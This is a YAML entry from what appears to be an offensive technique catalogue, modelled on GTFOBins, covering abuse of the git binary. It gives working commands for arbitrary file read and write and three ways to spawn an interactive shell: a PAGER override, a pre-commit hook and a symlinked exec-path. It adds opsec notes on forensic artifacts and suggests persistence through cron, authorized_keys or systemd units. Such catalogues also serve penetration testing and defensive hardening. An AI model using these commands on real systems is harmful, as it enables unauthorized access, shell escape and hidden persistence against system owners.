---
name: git
capabilities:
- exec
- spawn
- read
- write
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  notes: ''
persistence_potential: true
examples:
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: git diff /dev/null /path/to/input-file
  notes: The read file content is displayed in `diff` style output format.
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: git apply --unsafe-paths --directory / x.patch
  notes: |-
    The patch can be created locally by creating the file that will be written on the target using its absolute path:

    ```
    echo DATA >/path/to/input-file
    git diff /dev/null /path/to/input-file >x.patch
    ```
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    git init .
    echo 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit
    chmod +x .git/hooks/pre-commit
    git -C . commit --allow-empty -m x
  notes: Git hooks are merely shell scripts and in the following example the hook associated to the `pre-commit` action is used. Any other hook will work, just make sure to be able perform the proper action to trigger it. An existing repository can also be used, and moving into the directory works too.
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    ln -s /bin/sh git-x
    git --exec-path=. x -p
references:
- https://gtfobins.github.io/gtfobins/git/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
